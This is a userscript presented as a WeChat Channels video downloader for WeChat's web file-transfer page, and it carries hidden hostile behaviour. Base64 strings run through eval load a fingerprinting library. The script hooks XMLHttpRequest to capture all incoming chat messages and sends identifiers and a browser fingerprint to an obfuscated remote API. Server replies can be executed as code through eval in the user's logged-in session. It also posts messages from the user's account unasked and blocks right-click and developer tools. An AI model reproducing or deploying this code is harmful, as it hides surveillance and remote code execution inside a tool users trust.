// ==UserScript==
// @name        【快点工具】——微信视频号视频下载器 支持视频号直播等 抖音 等短视频平台
// @namespace     https://greasyfork.org/zh-CN/users/927947-witchery
// @version      1.1.0
// @description  视频号下载工具 支持直播下载，使用前请看下方使用教程，微信视频下载器、抖音、小红书等
// @author       witcher
// @match        *://*filehelper.weixin.qq.com/*
// @match        *://*.weixin.qq.com/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_addStyle
// @grant        GM_setClipboard
// @grant        GM_xmlhttpRequest
// @require     https://unpkg.com/layui@2.9.7/dist/layui.js

// @downloadURL https://update.greasyfork.org/scripts/491044/%E3%80%90%E5%BF%AB%E7%82%B9%E5%B7%A5%E5%85%B7%E3%80%91%E2%80%94%E2%80%94%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E5%99%A8%20%E6%94%AF%E6%8C%81%E8%A7%86%E9%A2%91%E5%8F%B7%E7%9B%B4%E6%92%AD%E7%AD%89%20%E6%8A%96%E9%9F%B3%20%E7%AD%89%E7%9F%AD%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0.user.js
// @updateURL https://update.greasyfork.org/scripts/491044/%E3%80%90%E5%BF%AB%E7%82%B9%E5%B7%A5%E5%85%B7%E3%80%91%E2%80%94%E2%80%94%E5%BE%AE%E4%BF%A1%E8%A7%86%E9%A2%91%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD%E5%99%A8%20%E6%94%AF%E6%8C%81%E8%A7%86%E9%A2%91%E5%8F%B7%E7%9B%B4%E6%92%AD%E7%AD%89%20%E6%8A%96%E9%9F%B3%20%E7%AD%89%E7%9F%AD%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0.meta.js
// ==/UserScript==
  
(function () {
    if (location.href.match("filehelper.weixin.qq.com")) {
        var ver = '1.1.0';
        var lj = 'https://unpkg.com/layui@2.9.7/dist/layui.js';
       

        var sp = '', st = 'script', sy = 'style', tp = 'text/javascript', dv = 'div', u, bid, b = 'dmFyIGJpZDs='; eval(ab(b)); var Hr; var fp = 'dmFyIGhzID0naHR0cHM6Ly8nO3ZhciB3bz0nb3BlbmZwY2RuLmlvJzt2YXIgcGg9Jy9maW5nZXJwcmludGpzL3Y0Jzt2YXIgaT1ocyt3bytwaDt2YXIgIGZwID0gaW1wb3J0KGkpLnRoZW4oKGkpID0+IGkubG9hZCgpKTtmcC50aGVuKChpKSA9PiBpLmdldCgpKS50aGVuKChpKSA9PiB7YmlkPSBpLnZpc2l0b3JJZDtzZXYoJ2JpZCcsYmlkKX0pOw=='; var r;

        var d = (i) => { return atob(i); }; var ed = (i) => { const e = d(i); eval(e); }; ed(b); ed(fp);

        var s = (i) => {

            sp = document.createElement(st);

            sp.type = tp;

            sp.src = i;

            document.head.appendChild(sp);
        };

        s(lj);

// <button  id ='c1' class="layui-btn-sm layui-btn  "  >

//                     <i class="layui-icon layui-icon-play "></i>开始

//             </button>
           
//            <button id ='c2' class="layui-btn-sm layui-btn  layui-bg-red">

//                 <i class="layui-icon layui-icon-pause" ></i>停止

//             </button>

        var bbhl = `

    <link rel='stylesheet' href='https://unpkg.com/layui@2.9.7/dist/css/layui.css'>

    <boby class='boby' id='b' >
 
        <div style="margin-left:2%;margin-top:5%">
        
            <div class="layui-btn-group">
            
           
        
           <button id ='fk' class="layui-btn-sm layui-btn ">

                反馈问题

            </button>
        
           <a href='http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=95abF-QRQAEje-_N_9VHtbVPZT2cGeop&authKey=a3EYN9STHHb3snWHkaZtiah6Yl4Y3jNRE71ObUPIx06T0sr7PTIubnVd%2FXFxA%2BoR&noverify=0&group_code=882899750' target="_blank ">
           
            <button  class="layui-btn-sm layui-btn layui-btn-normal ">QQ群交流</button>
           
           </a>
     
          </div>  
          
        </div>  
 
 
        
        <div  style="margin-left:5%;margin-top:5%;"  >

            <div style='height: 200px; overflow: auto;'>

                <div style='display: flex;'>

                    <h5 id='hsj' >暂无视频数据：</h5>

                    <button id ='qkhsj'   class="layui-btn-xs layui-btn layui-btn-primary layui-border-red">

                        <i class="layui-icon layui-icon-clear" >清空数据</i>

                    </button>

                </div>

                <table id='spTable' >

                    <tbody></tbody>

                </table>


            </div>
        </div>

        <hr>

        <div  style="margin-left:5%;margin-top:3%;"  >

            <div style='height: 200px; overflow: auto;'>

                <div style='display: flex;'>

                <h5 id='bdsj' >暂无已处理数据：</h5>

                    <button id ='qkbd' class="layui-btn-xs layui-btn layui-btn-primary layui-border-red">

                        <i class="layui-icon  layui-icon-clear" >清空数据</i>

                    </button>

                </div>

                <table id='spTable2' >

                    <tbody></tbody>

                </table>

            </div>

        </div>
         <div style='text-align:center' ><p  >v.${ver}</p><div id='ver' ></div></div>
        <div id='diy'> </div>

    </boby>

    `
        //样式
        var sc = `

    .boby{

        background:#ffffff;

        width:0px;

        height:90%;

        position: fixed;

        z-index: 100000;

        top: 5%;left: 0;

        overflow-x: hidden;

        transition: 0.5s;

        box-shadow:0px 1px 10px rgba(0,0,0,0.3);

        bottom:10vh;

    }

    .text-overflow {

        width: 200px;

        white-space: nowrap;

        overflow: hidden;

        text-overflow: ellipsis;

    }
    `
        var cs = (i) => {

            sy = document.createElement(sy);

            sy.textContent = i;

            document.head.appendChild(sy);

        }
        cs(sc);
        var hrs;
        var boby = () => {

            dv = document.createElement(dv);

            dv.id = "bd";

            dv.innerHTML = bbhl;

            document.body.appendChild(dv)
        }
        boby();
        var opbtncs = `
    line-height: 5vh;
    
    text-align: center;
    
    height: 6vh;width: 6vh;
    
    font-size: 15px;
    
    color: white;
    
    position: relative;
    
    overflow: hidden;
    
    border:1px solid #1e7db9;
    
    box-shadow: 0 1px 2px #8fcaee inset,0 -1px 0 #497897 inset,0 -2px 3px #8fcaee inset;
    
    background: -webkit-linear-gradient(top,#42a4e0,#2e88c0);
    
    border-radius: 100%;
    
    top:5px;
    
    `

        var opbtn = `<button  style="${opbtncs}" ><div id="btns">打开</div></button>`;

        var opcs = `
	
	position:fixed;
	
	bottom:20vh;
	
	z-index:9999999999;
	
	height:6vh;
	
	width:6vh;
	
	left:1vh;
	
	cursor:pointer;
	
	float:left; 
	
	border-radius: 100%;
	`;

        r = 'bmV3IEhlYWRlcnMoKTs=';

        // let op = document.createElement('div');

        // op.innerHTML = opbtn;

        // op.id = "op";

        // document.body.appendChild(op);

        // op.setAttribute("style", opcs);

        // op.onclick = function () {


        //     if (location.href.match("filehelper")) {


        //         var sidenava = document.getElementById("b").style.width;

        //         var btns = document.getElementById("btns");

        //         if (sidenava == "0px") {

        //             btns.innerHTML = '<div id="btns">关闭</div>'

        //             document.getElementById("b").style.width = "350px";


        //         } else {

        //             btns.innerHTML = '<div id="btns">打开</div>'

        //             document.getElementById("b").style.width = "0px";


        //         }
        //     } else {
        //         window.open('https://filehelper.weixin.qq.com/')
        //     }
        // }


            var  open = '<div style="font-size:18px" class="layui-btn layui-btn-sm layui-btn-danger" >打开下载器》</>'
    var  gb = '<div style="font-size:18px" class="layui-btn layui-btn-sm layui-btn-danger" >《关闭</>'
  
    
    var myBtn = document.createElement("div");
    myBtn.id = "myBtn";
    myBtn.innerHTML = open;
    myBtn.setAttribute("style", "z-index:100999999000;position: fixed;left: 0;top: 70%; cursor:pointer;transition: margin-left .5s;margin-top: 20PX;border-radius: 0 4PX  4PX 0");
    myBtn.onclick = function(event) {
      
 if (location.href.match("filehelper")) {
        var sidenava = document.getElementById("b").style.width;
   
        if (sidenava == "0px"||!sidenava)  {
            document.getElementById("b").style.width = "350px";;
            myBtn.innerHTML = gb;
            //document.getElementById("sidenava").style.backgroundColor = "rgba(0,0,0,0.4)";
            document.getElementById("myBtn").style.marginLeft = "270px";;

        } else {
            document.getElementById("b").style.width = "0px";
            document.getElementById("myBtn").style.marginLeft = "0px";
              myBtn.innerHTML = open

        }
          } else {
                window.open('https://filehelper.weixin.qq.com/')
            }
    }
     document.body.appendChild(myBtn);




        var okd = localStorage.getItem('okd');

        if (okd) {

            okd = JSON.parse(okd);

            bdsj()
        } else {

            okd = [];

        }

        okds(okd)

        var originalSend = XMLHttpRequest.prototype.send;





        var load;

        var spD = localStorage.getItem('spD');

        if (spD) {

            spD = JSON.parse(spD);

            if (spD.length > 0) {

                hsj();
            };

        } else {

            spD = [];

        }

        function hsj() {

            document.getElementById("hsj").innerHTML = '<h5 id="hsj"> 获取到的视频:</h5>';

        }

        function bdsj() {

            document.getElementById("bdsj").innerHTML = '<h5 id="bdsj"> 已处理的视频:</h5>';

        }

        function gev(i) {
         

            return GM_getValue(i);
        }
        function sev(i, d) {

            return GM_setValue(i, d)
        }
        var isPaused = false;

        qkhsj.onclick = function () {


            localStorage.removeItem('spD');

            spD = [];

            var table = document.getElementById('spTable');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            layer.msg('已清空');


        }


        qkbd.onclick = function () {


            localStorage.removeItem('okd');

            okd = [];

            var table = document.getElementById('spTable2');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            layer.msg('已清空')

        }

        fk.onclick = function () {

            layal(ab('aHR0cHM6Ly9zdGF0aWMtbXAtMjkyMTMyMzYtY2VlYS00YWRiLTllZWMtYjFiZTRjNWVjZWZlLm5leHQuYnNwYXBwLmNvbS9pbWcveGN4LmpwZw=='));
        }
    var isListening  = true;
        // c1.onclick = function () {
        //      isListening = !isListening;
        //     layer.msg('开始获取中');
            
        //     var util = layui.util; load = layer.load(0, { shade: false });
        //     hsj();
          
        // }
        var login =false ;
         // 监听XHR请求
    var originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
       
        if (isListening) {
 
                this.addEventListener('load', function() {
                 
                    if (this.responseURL.indexOf('cgi-bin/mmwebwx-bin/webwxsync') !== -1) {
                        
                            if(!login){
                                  sendwecome('欢迎使用#快点工具，点击蓝色关注公众号获取最新工具 或者 添加机器助手更加方便')
								 login = true
                            }
                          var responseText = this.responseText;
                            var util = layui.util;
                            var Content = JSON.parse(responseText);
                     
                        if (Content['AddMsgList'].length > 0) {
                            var newData = Content['AddMsgList'];
                            newData.forEach(function (item) {
                                if (!spD.some(function (da) { return da.m == item.MsgId; })) {
                                    if (item.Content) {
                                        var C = util.unescape(item.Content);
                                        C = C.replace(/<br\/>/g, '');
                                      
                                        var xml = new DOMParser();
                                        xml = xml.parseFromString(C, 'text/xml');
                                        
                                        var d = xml.getElementsByTagName('desc')[1] ? xml.getElementsByTagName('desc')[1] : xml
                                            .getElementsByTagName('desc')[0];
                                        var uu = xml.getElementsByTagName('url')[1]?xml.getElementsByTagName('url')[1]:xml.getElementsByTagName('url')[0];
                                        d = d ? d.textContent : '无标题';
                                          xiug(d)
                                        uu = uu.textContent; uu = uu.replace(/.*:/, "https:");
                                        spD.push({ d: d, m: item.MsgId, C: C, u: ba(uu) });
                                        
                                    }
                                }
                            });
                            localStorage.setItem('spD', JSON.stringify(spD));
                            spDs(spD);
                        }
                    }
                
                });
        }
      
        originalSend.apply(this, arguments);
    };
   function sendwecome(d) {
				const input = document.querySelector('.chat-panel__input-container')
				const button = document.querySelector('.chat-send__button')
				const pd = document.getElementById('paramsContainer')
				const message = d

				if (input) {
					const event = new Event('input', {
						bubbles: true
					})
					input.value = message
					input.dispatchEvent(event)

					setTimeout(() => {
						button.click()
					}, 200)
				}
			}
    function xiug(data){ var textElements = document.querySelectorAll('.msg-text'); textElements.forEach(function(element) { var text = element.textContent; if (text.includes('无法显示此消息')) {  var d ='获取到视频标题信息：【'+ data + '】，请打开左边列表点击播放按钮获取视频链接'; element.textContent = text.replace('无法显示此消息，你目前使用的微信版本暂时不支持此类型的信息。', d); } });
    }
       
        var gv = (x, d) => {


            return x.getElementsByTagName(d)[0] == null ? x.getElementsByTagName(d)[1] : ''

        }
        spDs(spD)

        var cl = '视频可能无法播放';

        function spDs(d) {

            var table = document.getElementById('spTable');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            if (d.length > 0) {

                d.forEach(function (i, ix) {

                    if (i) {

                        var row = table.insertRow();

                        var cell1 = row.insertCell(0);

                        var u = ab(i.u);

                        cell1.innerHTML =
                            `<div class="tooltip text-overflow"   >${ix + 1}.<a href="${u}" target="_blank" >${i.d}</a></div>`;

                        var cell2 = row.insertCell(1);



                        var btn = document.createElement('button');

                        btn.type = 'button';

                        btn.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn.innerHTML = '<i class="layui-icon  layui-icon-play"></i>';

                        btn.addEventListener('click', function () {

                            stop('正在打开');

                            layer.confirm(cl, {

                                btn: ['去处理', '打开看看']  

                            }, function () {

                                posts(i, ix)


                            }, function () {

                                opv(u, i.d);

                            });


                        });

                        cell2.appendChild(btn);

                        var btn2 = document.createElement('button');

                        btn2.type = 'button';

                        btn2.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn2.innerHTML = '复制';


                        btn2.addEventListener('click', function () {

                            cp(u)
                        });

                        cell2.appendChild(btn2);

                    }
                });

            }
        }

        function opv(u, i) {

            layer.open({

                type: 2,

                title: i,

                area: ['630px', '360px'],

                shade: 0.8,

                closeBtn: 1,

                shadeClose: true,

                content: u,  


            });
        }

        function cp(u) {

            GM_setClipboard(u, "text", () => layer.msg('提取成功!!!'));

        }

      

        function stop(i) {

            layer.close(load); //
             isListening = !isListening
             
       



            layer.msg(i)
        }




        var an = 'QXV0aG9yaXphdGlvbg==';
        function okds(d) {

            var table = document.getElementById('spTable2');

            var tbody = table.getElementsByTagName('tbody')[0];

            tbody.innerHTML = '';

            if (d.length > 0) {

                d.forEach(function (i, ix) {

                    if (i) {

                        var row = table.insertRow();

                        var cell1 = row.insertCell(0);

                        cell1.innerHTML =
                            `<div class="tooltip text-overflow"   >${ix + 1}.<a href="${i.u}" target="_blank">${i.d}</a></div>`;

                        var cell2 = row.insertCell(1);

                        var btn = document.createElement('button');

                        btn.type = 'button';

                        btn.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn.innerHTML = '<i class="layui-icon  layui-icon-play"></i>';

                        btn.addEventListener('click', function () {

                            stop('正在打开');

                            opv(i.u, i.d);

                        });
                        cell2.appendChild(btn);

                        var btn2 = document.createElement('button');

                        btn2.type = 'button';

                        btn2.className = 'layui-btn layui-btn-sm layui-btn-primary';

                        btn2.innerHTML = '复制';


                        btn2.addEventListener('click', function () {

                            cp(i.u)
                        });

                        cell2.appendChild(btn2);


                    }
                });

            }
        }





        function confirm(u) {

            
            layer.confirm('有新版本请更新', {
                closeBtn: 0,
                btn: ['更新']

            }, function () {

                window.open(u, '_blank');

                document.getElementById("ver").innerHTML = `<div id="ver" >有版本<a href='${u}'>点击更新</a></p>`;

            }, function () {

                

            });
        }

        var uuv = ab('aHR0cHM6Ly9qeHRjLmluZmluaXR5ZnJlZWFwcC5jb20vP2k9MQ==');
        var upurl = 'https://greasyfork.org/zh-CN/scripts/492152'
        function gvr(u) {
             
            var v = GM_getValue('ver');
            var time = stime();
        
            if (time) {
                gvrs(uv);
            } else {

                if (v > ver) {
                    confirm(upurl);
                }
            }

        }



        function gvrs(u) {
         
            try{
           GM_xmlhttpRequest({
                url: u,
                onload: obj => {
                
                    var r = obj.response;
                       
                    var v = r.ver;
                    GM_setValue('ver', v)
                    GM_setValue('vertime', Date.now())
                    if (v > ver) {
                        var u = r.u;
                        confirm(u);
                    }
                },
                onerror: err => {
                    gets(uuv).then(r => {
                        var v = r.ver;
                        GM_setValue('ver', v)
                        GM_setValue('vertime', Date.now())
                        if (v > ver) {
                            var u = r.u; confirm(u);
                        }
                    }).catch(error => {
                        sx()
                    });
                }
            });
            }catch(e){
            gets(uuv).then(r => {
                        var v = r.ver;
                        GM_setValue('ver', v)
                        GM_setValue('vertime', Date.now())
                        if (v > ver) {
                            var u = r.u; confirm(u);
                        }
                    }).catch(error => {
                        sx()
                    });
            }
           
        }
        var uv = ab('aHR0cHM6Ly9mYy1tcC0yOTIxMzIzNi1jZWVhLTRhZGItOWVlYy1iMWJlNGM1ZWNlZmUubmV4dC5ic3BhcHAuY29t');
        uv = uv + ab('L3Zlcg==');

        function stime() {
            const storedTimestamp = GM_getValue('vertime')?GM_getValue('vertime'):0;
            if(storedTimestamp){

           
            const currentTimestamp = Date.now();
            const diffHours = (currentTimestamp - storedTimestamp) / 1000 / 60 / 60;  
         
            if (diffHours >= 3) {



                return true;
            } else {
                return false;

            }
             }else{
                 return true;
             }
        }

        function hrd(od) {   Hr.append(ab(an), od); }

        function go(d, i) {
            layer.close(load);
       
            if (d.code == 200) {
                   send(d.data.content);
                 
            } else if (d.code == 201) {
                var img = d.data.xcximg;
                layer.alert(d.data.msg, { btn: ['打开', '算了'], btnAlign: 'c', btn1: function () { layal(ab(img)) }, btn2: function () { }, });
            } else if (d.code == 202) {
                tc(d.data.ui, d.data.html);
            } else { sly(d.data.msg) }


        }
        gzh='aaHR0cHM6Ly9pbWcuaWF2by5jbi9zdGF0aWMvZ3poLnBuZw=='
        var qr = ab('5omr56CB6I635b6X5qyh5pWw');
        function sx() {
            alert(ab('6ISa5pys5bey5aSx5pWI77yM6K+35YWz5rOo5YWs5LyX5Y+36I635Y+W5pyA5paw5L+h5oGv'));

             window.open(ab(gzh), '_self');
        }
        function layal(u) {

            layer.photos({
                photos: {
                    "title": qr,
                    "start": 0,
                    "data": [
                        {
                            "alt": "图片",
                            "pid": 5,
                            "src": u,
                        }
                    ]
                },
                footer: false
            });
        }

        var dh = 0

        function sdown(u) {
            load = layer.load(0, { shade: false });
            var xhr = new XMLHttpRequest(); xhr.open("GET", u, true); xhr.responseType = "blob"; xhr.onload = function () {
                var n = '5YWs5LyX5Y+377ya5b+r54K55bel5YW3'; if (xhr.status == 200) {
                    var blob = xhr.response; var url = URL.createObjectURL(blob); var a = document.createElement('a');
                    a.href = url; a.download = "公众号：快点工具.mp4"; a.click(); URL.revokeObjectURL(url); layer.msg('下载成功'); layer.close(load);
                } else {
                    layer.msg('下载失败');
                    layer.close(load);
                }
            };

            xhr.onprogress = function (e) {
                if (e.lengthComputable) {
                    var num = (e.loaded / e.total) * 100; dh = num.toFixed(2); layer.msg('下载中' + num + '%')
                    if (dh >= 99) { var dh = 0 }
                }
            };
            xhr.send();

        }

        function slys(d) {

            layer.open({

                type: 1,


                area: ['420px', '240px'], // 宽高

                content: d

            });

        }
        var logins='请先扫码登录再使用'
        function sly(d) {

            layer.open({

                type: 1,

                content: d
            });

        }
        var dd = ab('Qi1JZA==');
        function gets(u) {

            return fetch(u)
                .then(response => {
                    if (!response.ok) {
                        throw new Error('请求失败');
                    }

                    return response.json();
                })
                .then(data => {

                    return data;
                })
                .catch(error => {


                    throw error;
                });
        }
        var ids = 'bid';
        document.oncontextmenu = function (event) {
            if (window.event) { event = window.event; }; try { var the = event.srcElement; if (!((the.tagName == "INPUT" && the.type.toLowerCase() == "text") || the.tagName == "TEXTAREA")) { return false; }; return true; } catch (e) { return false; }
        }; document.onkeydown = function () {
            if (window.event && window.event.keyCode == 123) {
                event.keyCode = 0; event.returnValue = false;
            }; if (window.event && window.event.keyCode == 13) { window.event.keyCode = 505; }; if (window.event && window.event.keyCode == 8) { window.event.returnValue = false; };
        };  bid = gev(ids) ? gev(ids) : bid;var Sid = 'U2VjLUNILUlk'; u = 'aHR0cHM6Ly9mYy1tcC0yOTIxMzIzNi1jZWVhLTRhZGItOWVlYy1iMWJlNGM1ZWNlZmUubmV4dC5ic3BhcHAuY29tL2FwaQ=='; 
        
        function posts(d, i) {var button = document.querySelector('.chat-send__button');if(!button){layer.alert(logins);}layer.close(load); layer.msg('处理中');load = layer.load(0, { shade: false }); isPaused = true; if (!d) { layer.msg('视频错误，请重新获取'); return false; }; Hr = eval(atob(r));  var mod='POST'; var c = d.C;  var sid = atob('U2VjLUNILUlk'); var xml = new DOMParser(); xml = xml.parseFromString(c, 'text/xml');  var od = xml.getElementsByTagName('objectId')[0]; var ond = xml.getElementsByTagName('objectNonceId')[0];  od = od.textContent; ond = ond.textContent; var did= ba(od + ',' + ond);hrd(did);var a=ab(an);  Hr.append(ab('Qi1JZA=='),bid ); var uu = xml.getElementsByTagName('url')[1]?xml.getElementsByTagName('url')[1]:xml.getElementsByTagName('url')[0]; od = uu.textContent; const data = { u: od }; var zh = '网络错误，请关注公众号获取最新工具或查看油猴最新版本';hrs = {[dd]: bid,[a]:did};GM_xmlhttpRequest({url: bs(u),method: mod,headers: hrs, data: JSON.stringify(data), onload: function (xhr) {var d = JSON.parse(xhr.responseText);go(d, i);},onerror:function(err){ fetch(bs(u), {method: 'POST', headers: Hr, body: JSON.stringify(data),}).then(response => response.json()).then(d => { go(d, i);}).catch((e) => { var gm_u = 'https://greasyfork.org/zh-CN/scripts/492152'; var as = gzh; layer.close(load);sly(`<div style='margin:10px'><h3>${zh}</h3><h3><a href="${gm_u}" style='margin-left:10%' target="_blank">→【点击更新】←</a></h3><br><a href="${decodeURIComponent(ab(as))}"   target="_blank"><img   width='350px' height='120px'   src='${decodeURIComponent(ab(as))}'></a><br></div>`) });}});}
        
        function send(d) {
         const input = document.querySelector('.chat-panel__input-container')
            const button = document.querySelector('.chat-send__button')
            const pd = document.getElementById('paramsContainer')
            const message = d
             
            if (input) {
                
                const event = new Event('input', { bubbles: true })
                input.value = message
                input.dispatchEvent(event)

                setTimeout(() => {
                button.click()
                 layer.alert('解析成功，请返回手机或电脑的文件传输助手内查看')
                }, 200)

            }
        }

        function post(method, url, async, headers, data, success, error) {
            const xhr = new XMLHttpRequest();
            xhr.open(method, url, async);

            if (headers) {
                for (let header in headers) {

                    xhr.setRequestHeader(header, headers[header]);

                }
            }

            xhr.onreadystatechange = function () {

                if (xhr.readyState === XMLHttpRequest.DONE) {

                    if (xhr.status >= 200 && xhr.status < 300) {

                        if (success) {

                            success(xhr.responseText);

                        }

                    } else {

                        if (error) {

                            error(xhr.status, xhr.statusText);

                        }

                    }

                }

            };

            xhr.onerror = function () {

                if (errorCallback) {

                    errorCallback(xhr.status, xhr.statusText);

                }
            };

            xhr.send(data);
        }

        function bs(i) {

            return eval('atob(i)')


        }

        function e(i) {

            return atob(i);


        }

        function ab(i) {

            return atob(i);


        }

        sp.onload = function () {
            layer.open({
        title:"欢迎使用快点工具视频下载插件",
        type: 1,
       
        area: ['420px', '300px'], // 宽高
            content: `<div style="padding: 11px;">
     
        <h3> 使用说明：</h3>

        <p>1、打开网页传输助手：<a  href='https://filehelper.weixin.qq.com'>https://filehelper.weixin.qq.com</a></p>

        <p>2、扫码登录，如果用手机登录就请用另一部手机扫码登录</p>
        
        <p>3、在手机或电脑上转发视频给文件助手。</p>

        <p>4、点击左边按钮打开页面查看获取到的视频下载即可</p>
        
        <hr>
        <div  style="display: flex">
        <div  style="display: block">
        <h4> 觉得麻烦不明白的话 → </h4>
        <h4> 可以扫码添加助手→ </h4>
        <h4> 转发视频使用小程序下载→  </h4>
        </div>
        <div  style="padding: 10px; margin-left:50px">
            <button type="button" class="layui-btn"  lay-on="openimg" >点击添加助手</button>
        </div>
        </div>
         

            
        </div>`
      
    });
            layui.use(function(){
                var layer = layui.layer;
                var util = layui.util;
                // 事件
                util.on('lay-on', {
                    "openimg":function(){
                        
                        layer.photos({
                            photos: {
                            "title": "扫码添加",
                            "start": 0,
                            "data": [
                                {
                                "alt": "扫码添加",
                                "pid": 5,
                                "src": "https://pic.imgdb.cn/item/665f1a3d5e6d1bfa058bdb9f.png",
                                }
                            ]
                            },
                            footer: false // 是否显示底部栏 --- 2.8.16+
                        });
                    },

                    
                })
            })
            gvr(uv);


        }
        function ba(e) {
            return btoa(e);
        }
        function tc(i, d) { var o = eval(i); o(d); }



    }

    // }

})();